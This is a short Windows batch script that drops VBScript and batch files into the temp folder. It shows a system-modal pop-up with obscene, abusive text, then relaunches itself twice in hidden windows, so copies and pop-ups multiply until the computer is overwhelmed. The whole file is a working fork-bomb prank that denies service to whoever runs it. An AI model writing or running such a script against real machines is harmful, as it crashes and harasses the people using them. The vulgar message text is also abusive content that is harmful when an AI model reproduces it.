@echo off
call :delfile %tmp%\a082a1c14df86dfaadcfbf2563a33203.vbs
call :delfile %tmp%\e91f08460ac4de540c51463bc46a2b55.vbs
call :delfile %tmp%\fa07322c9d9e6a1979b487e509dc8c65.bat

echo x=msgbox("Go suck a cock" ,vbInformation+vbSystemModal, "You just got fucked") > %tmp%\a082a1c14df86dfaadcfbf2563a33203.vbs
echo CreateObject("Wscript.Shell"^).Run """" ^& WScript.Arguments(0^) ^& """", 0, False > %tmp%\e91f08460ac4de540c51463bc46a2b55.vbs
(
    echo @echo off
    echo start /wait %tmp%\a082a1c14df86dfaadcfbf2563a33203.vbs
    echo wscript.exe %tmp%\e91f08460ac4de540c51463bc46a2b55.vbs %tmp%\fa07322c9d9e6a1979b487e509dc8c65.bat
    echo wscript.exe %tmp%\e91f08460ac4de540c51463bc46a2b55.vbs %tmp%\fa07322c9d9e6a1979b487e509dc8c65.bat
    echo exit
) > %tmp%\fa07322c9d9e6a1979b487e509dc8c65.bat
wscript.exe %tmp%\e91f08460ac4de540c51463bc46a2b55.vbs %tmp%\fa07322c9d9e6a1979b487e509dc8c65.bat
exit

:delfile
IF EXIST %~1 (
    del %~1
)
exit /b